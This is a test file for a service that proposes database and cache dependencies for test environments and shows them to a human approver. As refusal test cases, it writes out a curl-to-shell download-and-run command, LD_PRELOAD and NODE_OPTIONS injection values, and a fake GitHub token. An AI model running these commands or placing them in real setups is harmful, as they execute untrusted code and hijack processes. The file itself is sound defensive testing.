// Test services: a setup draft's dependency candidates become PROPOSED dependencies (through the backing chooser, real catalog software only), and the card lines say what backs each one plainly.
import { describe, expect, it } from "vitest";
import { TEST_ENV_DRAFT_RESULT_KEY, TestEnvironmentBodySchema, type OrgId, type TestEnvDraft, type TestEnvironmentBody, INDEX_EXPIRY_ATTRIBUTE, projectPk, projectRevisionKey, testEnvApprovalRisk, testEnvDigest, testEnvLessSafeChanges } from "@agentx/contracts";
import { DEPENDENCIES_LEFT_OUT_NOTE, DEPENDENCIES_NO_CATALOG_NOTE, DEPENDENCIES_NOT_PROPOSED_NOTE } from "../../packages/broker/src/core/test-env/dependency-proposal.js";
import { dependencyCardLines } from "../../packages/broker/src/core/test-env/dependency-card-lines.js";
import { sanitizeTestEnvDraft, testEnvDraftEndItems } from "../../packages/broker/src/core/test-env/draft.js";
import { TEST_SERVICES_MIN_CATALOG_REVISION, taskDependencyPlansOf } from "../../packages/broker/src/core/test-env/dependency-plan.js";
import { pinnedCatalog, unpinnedCatalog, verifiedCatalog } from "../support/catalog-pinning.js";
import { readFileSync } from "node:fs";
import { projectStore } from "../support/test-env-world.js";
import { MemoryDocumentStore } from "../../packages/broker/src/ports/memory-document-store.js";
import { testEnvLatestKey } from "../../packages/broker/src/core/test-env/environment.js";
import { testEnvChangeLines } from "../../packages/broker/src/core/test-env/change-lines.js";
import { DEPENDENCIES_WITH_DEVCONTAINER_WORDS, projectUsesDevcontainer } from "../../packages/broker/src/core/test-env/devcontainer-check.js";
import { BENCH_ORG, bench } from "../support/test-env-bench.js";

const ORG = "org_aaaaaaaaaaaaaaaaaaaa" as OrgId;
const PROJECT = "service";
const ON = { ROVARA_TEST_ENVIRONMENT: "1", ROVARA_TEST_SERVICES: "1" };
const cmd = (executable: string, args: string[] = []) => ({ cwd: "service", executable, args, timeoutSeconds: 600 });
const baseBody = (over: Record<string, unknown> = {}): TestEnvironmentBody => TestEnvironmentBodySchema.parse({
  tier: "sandbox", repos: [{ repositoryId: "service", setupCommands: [cmd("pip", ["install", "-e", "."])], checks: [{ id: "unit", label: "Unit tests", command: cmd("pytest", ["-q"]), kind: "test" }] }],
  roundBudgetMin: 30, selection: { method: "full", alwaysRun: [], fullSuiteOn: [] }, nightly: { enabled: false, cronUtc: "0 6 * * *", branch: "main" },
  services: [], data: { seeds: [], generator: "faker_seeded", seed: 1 }, accounts: [], prodDeny: { accountIds: [], hosts: [], arnPrefixes: [] }, capture: { screenshots: "failed", video: false, traces: false }, ...over,
});
const candidate = (family: string, over: Record<string, unknown> = {}) => ({
  family, kind: family === "postgres" || family === "mysql" ? "database" : family === "redis" ? "cache" : family.startsWith("aws:") ? "object_store" : "other", evidence: [{ path: "docker-compose.yml", line: 4 }], strength: "declared", hints: { version: family === "postgres" ? "16" : undefined, envNames: ["DATABASE_URL"] }, ...over,
});
const clean = <T>(value: T): T => JSON.parse(JSON.stringify(value)) as T;
const draftOf = (candidates?: unknown[], environment: unknown = baseBody()): unknown => ({ environment, valueSources: [], pendingServices: [], notes: ["Found pytest."], questions: [], ...(candidates === undefined ? {} : { dependencies: clean(candidates) }) });
const options = (catalog: ReturnType<typeof verifiedCatalog> | "none" = verifiedCatalog(pinnedCatalog()), env: NodeJS.ProcessEnv = ON) => ({ env, propose: { catalog: catalog === "none" ? undefined : catalog, edition: "public" as const, projectId: PROJECT } });

describe("a draft's dependency candidates", () => {
  it("is today's draft when there are none, with the switch on or off", () => {
    expect(sanitizeTestEnvDraft(draftOf(), options())).toEqual(sanitizeTestEnvDraft(draftOf()));
    const kept = sanitizeTestEnvDraft(draftOf(), options())!;
    expect("dependencies" in kept).toBe(false);
    expect("dependencies" in kept.environment).toBe(false);
  });

  it("drops the candidates and proposes nothing with tx off (the draft is what it was)", () => {
    const off = sanitizeTestEnvDraft(draftOf([candidate("postgres")]), options("none", { ROVARA_TEST_ENVIRONMENT: "1", ROVARA_TEST_SERVICES: "0" }))!;
    expect(off).toEqual(sanitizeTestEnvDraft(draftOf())!);
    // DEC 254z-amend3: switched on by default, but where the host says it cannot run them (hosted Code today) the draft is the plain one too.
    expect(sanitizeTestEnvDraft(draftOf([candidate("postgres")]), { env: { ROVARA_TEST_SERVICES_UNAVAILABLE: "workers" } })).toEqual(sanitizeTestEnvDraft(draftOf()));
  });

  it("keeps the candidates when it has no catalog to propose from, and says so", () => {
    const kept = sanitizeTestEnvDraft(draftOf([candidate("postgres")]), options("none"))!;
    expect(kept.dependencies).toHaveLength(1);
    expect(kept.environment.dependencies).toBeUndefined();
    expect(kept.notes).toContain(DEPENDENCIES_NO_CATALOG_NOTE);
    // The write at the end of a setup draft passes no options at all: candidates only, no notes.
    const written = sanitizeTestEnvDraft(draftOf([candidate("postgres")]), { env: ON });
    expect(written!.dependencies).toHaveLength(1);
    expect(written!.environment.dependencies).toBeUndefined();
    expect(written!.notes).toEqual(["Found pytest."]);
  });

  it("carries the validated candidates into what is stored at the end of a setup draft, and nothing with tx off", () => {
    const task = { taskId: "t1", purpose: "setup_draft", project: PROJECT, orgId: ORG } as never;
    const operation = { kind: "task", workflowMode: "SETUP_DRAFT" };
    const stored = (env: NodeJS.ProcessEnv, candidates: unknown[] = [candidate("postgres")]) => {
      const items = testEnvDraftEndItems(task, operation, { status: "SUCCEEDED", result: { [TEST_ENV_DRAFT_RESULT_KEY]: draftOf(candidates) } }, "2026-11-03T10:00:00.000Z", env);
      return (items[0] as { item: { draft: TestEnvDraft } } | undefined)?.item.draft;
    };
    expect(stored(ON)!.dependencies).toEqual([candidate("postgres")].map((entry) => clean(entry)));
    expect(stored({ ROVARA_TEST_ENVIRONMENT: "1", ROVARA_TEST_SERVICES: "0" })).toEqual(sanitizeTestEnvDraft(draftOf()));
    expect("dependencies" in stored({ ROVARA_TEST_ENVIRONMENT: "1", ROVARA_TEST_SERVICES: "0" })!).toBe(false);
    // An invalid candidate makes the whole report not a draft: nothing is stored, and the setup draft's own result is untouched.
    expect(stored(ON, [candidate("postgres", { hints: { password: "x" } })])).toBeUndefined();
  });

  it("proposes a real Postgres from the catalog, with the catalog's own variable names and the files the detector cited", () => {
    const draft = sanitizeTestEnvDraft(draftOf([candidate("postgres", { evidence: [{ path: "docker-compose.yml", line: 4 }, { path: "db/init.sql", line: 1 }] })]), options())!;
    const proposed = draft.environment.dependencies!;
    expect(proposed).toHaveLength(1);
    expect(proposed[0]).toMatchObject({ id: "postgres", name: "Postgres", kind: "database", family: "postgres", usedBy: ["integration"], reset: "fresh_per_round", seeds: [], backing: { kind: "local", catalogId: "postgres@16" }, found: [{ path: "docker-compose.yml", line: 4 }, { path: "db/init.sql", line: 1 }] });
    expect(proposed[0]!.connect.env.map((entry) => entry.name)).toContain("DATABASE_URL");
    expect(proposed[0]!.connect.hostAliases).toEqual(["postgres"]);
    // Nothing a repository wrote is in it as a name or value: the name is a fixed word, and the whole thing is a valid environment.
    expect(TestEnvironmentBodySchema.safeParse(draft.environment).success).toBe(true);
  });

  it("proposes only what the catalog has PINNED: an unpinned catalog proposes nothing", () => {
    const draft = sanitizeTestEnvDraft(draftOf([candidate("postgres")]), options(verifiedCatalog(unpinnedCatalog(TEST_SERVICES_MIN_CATALOG_REVISION))))!;
    expect(draft.environment.dependencies).toBeUndefined();
    expect(draft.notes).toContain(DEPENDENCIES_NOT_PROPOSED_NOTE);
  });

  it("leaves out, with one fixed note, whatever is not real catalog software", () => {
    const draft = sanitizeTestEnvDraft(draftOf([
      candidate("postgres"), candidate("aws:kinesis"), candidate("http:api.example-pay.com", { kind: "http_api" }), candidate("redis", { hints: { fakedByTests: true } }),
    ]), options())!;
    expect(draft.environment.dependencies!.map((entry) => entry.id)).toEqual(["postgres"]);
    expect(draft.notes.filter((note) => note === DEPENDENCIES_NOT_PROPOSED_NOTE)).toHaveLength(1);
    expect(draft.notes.join(" ")).not.toMatch(/example-pay|kinesis/iu);
    // The candidates themselves are still in the draft for a person to see.
    expect(draft.dependencies).toHaveLength(4);
  });

  it("proposes nothing when the candidates cannot be proposed together", () => {
    // mysql and postgres both set DATABASE_URL: two dependencies that set the same variable are not a list the contract accepts.
    const draft = sanitizeTestEnvDraft(draftOf([candidate("postgres"), candidate("mysql", { hints: { version: "8" } })]), options())!;
    expect(draft.environment.dependencies).toBeUndefined();
    expect(draft.notes).toContain(DEPENDENCIES_LEFT_OUT_NOTE);
  });

  it("refuses a draft whose own environment lists dependencies (a worker never proposes a backing), and keeps one with an empty list", () => {
    const claimed = baseBody({ dependencies: [{
      id: "payments", name: "Payments", kind: "http_api", family: "http:api.example-pay.com", found: ["model"], usedBy: ["integration"], backing: { kind: "test_account", accountId: "payments-test" },
      connect: { env: [{ name: "PAY_URL", template: "https://{host}" }], hostAliases: [] }, seeds: [], reset: "fresh_per_round",
    }] });
    expect(sanitizeTestEnvDraft(draftOf(undefined, claimed), options())).toBeUndefined();
    expect(sanitizeTestEnvDraft(draftOf([candidate("postgres")], claimed), options())).toBeUndefined();
    expect(sanitizeTestEnvDraft(draftOf(undefined, baseBody({ dependencies: [] })), options())).toEqual(sanitizeTestEnvDraft(draftOf()));
  });

  it("reads a stored draft (candidates only) the same every time", () => {
    const stored = sanitizeTestEnvDraft(draftOf([candidate("postgres")]), { env: ON })!;
    const first = sanitizeTestEnvDraft(stored, options())!;
    expect(first.environment.dependencies!.map((entry) => entry.id)).toEqual(["postgres"]);
    expect(sanitizeTestEnvDraft(stored, options())).toEqual(first);
  });

  it("stays bounded: more than 64 candidates is not a draft", () => {
    expect(sanitizeTestEnvDraft(draftOf(Array.from({ length: 65 }, () => candidate("postgres"))), options())).toBeUndefined();
  });
});

describe("the card's lines", () => {
  it("show a repository's text safely", () => {
    // The schema refuses hidden characters in a path; a value that got here some other way is still shown as codes.
    const dependency = {
      id: "postgres", name: "Postgres", kind: "database", family: "postgres", found: [{ path: "a\u202Eb/compose.yml", line: 2 }], usedBy: ["integration"], backing: { kind: "local", catalogId: "postgres@16", config: {} },
      connect: { env: [], hostAliases: [] }, seeds: [], reset: "fresh_per_round",
    } as never;
    const [line] = dependencyCardLines([dependency]);
    expect(line).toContain("[U+202E]");
    expect(line).not.toContain("\u202E");
  });

  it("say what backs each kind of dependency in fixed words", () => {
    const words = (backing: unknown) => dependencyCardLines([{ id: "x", name: "Thing", kind: "other", family: "x", found: ["model"], usedBy: ["unit"], backing, connect: { env: [], hostAliases: [] }, seeds: [], reset: "fresh_per_round" } as never])[0];
    expect(words({ kind: "test_account", accountId: "a" })).toContain("second person approves");
    expect(words({ kind: "project_image", imageId: "a" })).toContain("your own image");
    expect(words({ kind: "none", reason: "faked_by_tests" })).toContain("faked by your own tests");
    expect(words({ kind: "local", catalogId: "postgres@16", config: {} })).toContain("Found by Rovara's reading of the code.");
  });
});

describe("what the approver sees, seed commands and re-proposals", () => {
  const ORG: OrgId = BENCH_ORG;
  const PROJECT = "service";
  const cmd = (executable: string, args: string[] = [], cwd = "service") => ({ cwd, executable, args, timeoutSeconds: 600 });
  const dep = (over: Record<string, unknown> = {}) => ({
    id: "postgres", name: "Postgres", kind: "database", family: "postgres", found: [{ path: "docker-compose.yml", line: 4 }], usedBy: ["integration"],
    backing: { kind: "local", catalogId: "postgres@16", config: { database: "app", user: "app" } },
    connect: { env: [{ name: "DATABASE_URL", template: "postgres://{user}:{password}@{host}:{port}/{db}" }], hostAliases: ["postgres"] }, seeds: [], reset: "fresh_per_round", ...over,
  });
  const body = (dependencies: unknown[] = [dep()], over: Record<string, unknown> = {}): TestEnvironmentBody => TestEnvironmentBodySchema.parse({
    tier: "sandbox", repos: [{ repositoryId: "service", setupCommands: [], checks: [{ id: "unit", label: "Unit tests", command: cmd("pytest", ["-q"]), kind: "test" }] }], roundBudgetMin: 30,
    selection: { method: "full", alwaysRun: [], fullSuiteOn: [] }, nightly: { enabled: false, cronUtc: "0 6 * * *", branch: "main" }, services: [], data: { seeds: [], generator: "faker_seeded", seed: 1 }, accounts: [],
    prodDeny: { accountIds: [], hosts: [], arnPrefixes: [] }, capture: { screenshots: "failed", video: false, traces: false }, dependencies, ...over,
  });
  const seeded = (command = cmd("psql", ["-f", "seed.sql"])) => dep({ seeds: [{ command }] });

  describe("what the approver sees of a dependency's data", () => {
    it("lists the seed commands, the files, the init files and the variables it sets, each as one plain line", () => {
      const withAll = dep({ backing: { kind: "local", catalogId: "postgres@16", config: { database: "app", user: "app", initFiles: ["db/init.sql"] } }, seeds: [{ command: cmd("psql", ["-f", "seed.sql"]) }, { fixturePath: "db/fixture.sql" }] });
      const lines = dependencyCardLines(body([withAll]).dependencies!);
      expect(lines).toEqual([
        "Postgres: runs the real software from Rovara's image list. Found in docker-compose.yml, line 4.",
        "Postgres test data: runs service: psql -f seed.sql.",
        "Postgres test data: loads db/fixture.sql.",
        "Postgres starts with: db/init.sql.",
        "Postgres sets: DATABASE_URL.",
      ]);
    });

    it("redacts what looks like a secret in a line, and cuts a long list of variables", () => {
      const token = ["gh", "p_", "a".repeat(36)].join("");
      const lines = dependencyCardLines(body([dep({ seeds: [{ command: cmd("psql", ["-c", `select '${token}'`]) }] })]).dependencies!);
      expect(lines.join("\n")).not.toContain(token);
      const many = dep({ connect: { env: Array.from({ length: 12 }, (_unused, index) => ({ name: `DB_VALUE_${String(index)}`, template: "{host}" })), hostAliases: ["postgres"] } });
      expect(dependencyCardLines(body([many]).dependencies!).at(-1)).toBe("Postgres sets: DB_VALUE_0, DB_VALUE_1, DB_VALUE_2, DB_VALUE_3, DB_VALUE_4, DB_VALUE_5, DB_VALUE_6, DB_VALUE_7 and 4 more.");
    });

    it("shows a changed seed command or init file as a change, even when many other values changed", () => {
      const manyChecks = (label: string) => ({ repos: [{ repositoryId: "service", setupCommands: [], checks: Array.from({ length: 30 }, (_unused, index) => ({ id: `c${String(index)}`, label: `${label} ${String(index)}`, command: cmd("pytest", [`-k${label}${String(index)}`]), kind: "test" })) }] });
      const before = body([seeded()], manyChecks("a"));
      const after = body([seeded(cmd("psql", ["-f", "other.sql"]))], manyChecks("b"));
      const lines = testEnvChangeLines(before, after);
      expect(lines.length).toBeLessThanOrEqual(61);
      expect(lines.some((line) => line.startsWith("dependencies[postgres].seeds[0].command:") && line.includes("other.sql"))).toBe(true);
      const initBefore = body([dep({ backing: { kind: "local", catalogId: "postgres@16", config: { initFiles: ["db/a.sql"] } } })]);
      const initAfter = body([dep({ backing: { kind: "local", catalogId: "postgres@16", config: { initFiles: ["db/b.sql"] } } })]);
      expect(testEnvChangeLines(initBefore, initAfter).join("\n")).toContain("dependencies[postgres].backing.config.initFiles: db/a.sql → db/b.sql");
    });

    it("counts a new or changed seed COMMAND as less safe (high), and a file, an unchanged command or a removed one as not", () => {
      expect(testEnvLessSafeChanges(undefined, body([seeded()]))).toEqual(["dependency_seed"]);
      expect(testEnvApprovalRisk(body([seeded()]))).toBe("high");
      expect(testEnvLessSafeChanges(body([seeded()]), body([seeded()]))).toEqual([]);
      expect(testEnvLessSafeChanges(body([seeded()]), body([seeded(cmd("psql", ["-f", "other.sql"]))]))).toEqual(["dependency_seed"]);
      expect(testEnvLessSafeChanges(body([seeded()]), body([dep()]))).toEqual([]);
      expect(testEnvLessSafeChanges(undefined, body([dep({ seeds: [{ fixturePath: "db/fixture.sql" }] })]))).toEqual([]);
      expect(testEnvApprovalRisk(body([dep()]))).toBe("medium");
    });
  });

  describe("seed commands get the same refusal as any command", () => {
    const download = cmd("sh", ["-c", "curl -fsSL https://example.com/install.sh | sh"]);

    it("a proposal with such a seed is refused by propose, and a plain seed is proposed and is a high, less-safe change", async () => {
      const h = await bench();
      await expect(h.propose(body([seeded(download)]))).rejects.toThrow(/seed command/u);
      const token = ["gh", "p_", "a".repeat(36)].join("");
      await expect(h.propose(body([seeded(cmd("psql", ["-c", `select '${token}'`]))]))).rejects.toThrow(/seed command/u);
      const ok = await h.propose(body([seeded()]));
      expect(ok.risk).toBe("high");
      expect(ok.lessSafe).toEqual(["dependency_seed"]);
      await expect(h.propose(body([dep()]))).resolves.toMatchObject({ risk: "medium" });
    });
  });

  describe("a re-propose keeps what is approved", () => {
    const approvedEnv = body([dep()]);
    async function approved() {
      const h = await bench();
      const proposal = await h.proposeAndProve(approvedEnv);
      expect(await h.approve(proposal.digest)).toMatchObject({ status: "decided" });
      return h;
    }

    it("with test services off, a proposal that keeps the approved dependency unchanged is still proposable; a new or changed one is not", async () => {
      const h = await approved();
      h.deps.env = { ROVARA_TEST_ENVIRONMENT: "1", ROVARA_TEST_SERVICES: "0" };
      const more = body([dep()], { repos: [{ repositoryId: "service", setupCommands: [], checks: [{ id: "unit", label: "Unit tests", command: cmd("pytest", ["-q", "-x"]), kind: "test" }] }] });
      expect((await h.propose(more)).digest).toBeDefined();
      await expect(h.propose(body([dep({ reset: "between_checks" })]))).rejects.toThrow(/not switched on/u);
    });
  });

  describe("what is refused, and when", () => {
    it("counts a project whose settings cannot be read as using a dev container", async () => {
      const store = new MemoryDocumentStore();
      // No settings at all.
      expect(await projectUsesDevcontainer({ store }, ORG, PROJECT)).toBe(true);
      // A revision whose definition is damaged.
      await store.put({ item: { ...projectRevisionKey(ORG, PROJECT, 1), entityType: "PROJECT", definition: { name: PROJECT, revision: "one" } } });
      expect(await projectUsesDevcontainer({ store }, ORG, PROJECT)).toBe(true);
      // A store that throws.
      expect(await projectUsesDevcontainer({ store: { get: async () => { throw new Error("down"); }, query: async () => { throw new Error("down"); } } as never }, ORG, PROJECT)).toBe(true);
      // A project with settings and no dev container does not.
      expect(await projectUsesDevcontainer({ store: await projectStore(ORG, "plain") }, ORG, "plain")).toBe(false);
      expect(await projectUsesDevcontainer({ store: await projectStore(ORG, "boxed", { devcontainer: true }) }, ORG, "boxed")).toBe(true);
      expect(DEPENDENCIES_WITH_DEVCONTAINER_WORDS).toMatch(/not available yet/u);
    });

    it("refuses a catalog entry whose family is not the dependency's", () => {
      const catalog = verifiedCatalog(pinnedCatalog());
      const result = taskDependencyPlansOf({ body: body([dep({ family: "mysql", connect: { env: [], hostAliases: [] } })]), catalog, edition: "public" });
      expect(result).toEqual({ ok: false, reason: "not_in_catalog" });
    });

    it("keeps the minimum catalog revision equal to the catalog fixture's, so a catalog release forces a decision here", () => {
      const shipped = JSON.parse(readFileSync("tests/fixtures/service-catalog/catalog.json", "utf8")) as { revision: number };
      expect(TEST_SERVICES_MIN_CATALOG_REVISION).toBe(shipped.revision);
    });
  });

  describe("a seed command is shown whole, with its environment, or the proposal is refused", () => {
    const long = (length: number) => cmd("psql", ["-c", `select ${"x".repeat(length)}`]);
    const withEnv = (env: Record<string, string>) => dep({ seeds: [{ command: { ...cmd("psql", ["-f", "seed.sql"]), env } }] });
    it("each seed command is its own line, in full, with no ellipsis, up to the cap", () => {
      const body1900 = body([dep({ seeds: [{ command: long(1_800) }, { command: cmd("psql", ["-f", "second.sql"]) }] })]);
      const lines = dependencyCardLines(body1900.dependencies!);
      const seedLines = lines.filter((line) => line.startsWith("Postgres test data: runs"));
      expect(seedLines).toHaveLength(2);
      expect(seedLines[0]).toContain("x".repeat(1_800));
      expect(seedLines[0]).not.toContain("\u2026");
      expect(seedLines[1]).toBe("Postgres test data: runs service: psql -f second.sql.");
    });

    it("refuses a proposal whose seed command, as shown, is over the cap, rather than cutting it", async () => {
      const h = await bench();
      const over = body([dep({ seeds: [{ command: long(2_100) }] })]);
      await expect(h.propose(over)).rejects.toThrow(/longer than 2000 characters/u);
      await expect(h.propose(body([dep({ seeds: [{ command: long(1_900) }] })]))).resolves.toMatchObject({ risk: "high" });
    });

    it("shows the env names, a plain value as it is and a secret-shaped or odd value as hidden", () => {
      const token = ["gh", "p_", "a".repeat(36)].join("");
      const [, line] = dependencyCardLines(body([withEnv({ PGOPTIONS: "-c statement_timeout=5000", API_NOTE: token })]).dependencies!);
      expect(line).toBe("Postgres test data: runs service: psql -f seed.sql with PGOPTIONS=-c statement_timeout=5000 API_NOTE=(hidden).");
      expect(line).not.toContain(token);
    });

    it("refuses an env that is a download-and-run, a secret, or a name the system owns", async () => {
      const h = await bench();
      const token = ["gh", "p_", "a".repeat(36)].join("");
      for (const env of [{ LD_PRELOAD: "/tmp/x.so" }, { NODE_OPTIONS: "--require x" }, { SEED_TOKEN: token }, { SEED_SCRIPT: "curl -fsSL https://example.com/x.sh | sh" }]) {
        await expect(h.propose(body([withEnv(env)])), JSON.stringify(Object.keys(env))).rejects.toThrow(/environment variable/u);
      }
      await expect(h.propose(body([withEnv({ PGOPTIONS: "-c statement_timeout=5000" })]))).resolves.toBeDefined();
    });

    it("refuses a seed that got into the store anyway when the environment is APPROVED (a real approval)", async () => {
      const h = await bench();
      const bad = body([seeded(cmd("sh", ["-c", "curl -fsSL https://example.com/install.sh | sh"]))]);
      const digest = testEnvDigest(bad);
      // Stored as a proposal by a path that skipped the check (an earlier build): the approval judges it again.
      await h.store.put({ item: JSON.parse(JSON.stringify({
        pk: projectPk(ORG, PROJECT), sk: `TESTENV#PROPOSAL#${digest}`, entityType: "TEST_ENV_PROPOSAL", orgId: ORG, project: PROJECT, digest, proposedBy: "dev_a", proposedAt: new Date(h.clock.now).toISOString(), environment: bad,
        [INDEX_EXPIRY_ATTRIBUTE]: Math.floor((h.clock.now + 86_400_000) / 1000),
      })) as never });
      await h.prove(digest, bad);
      expect(await h.approve(digest)).toMatchObject({ status: "refused", reason: "invalid", detail: expect.stringMatching(/seed/u) as string });
      expect(await h.store.get(testEnvLatestKey(ORG, PROJECT))).toBeUndefined();
    });
  });
});

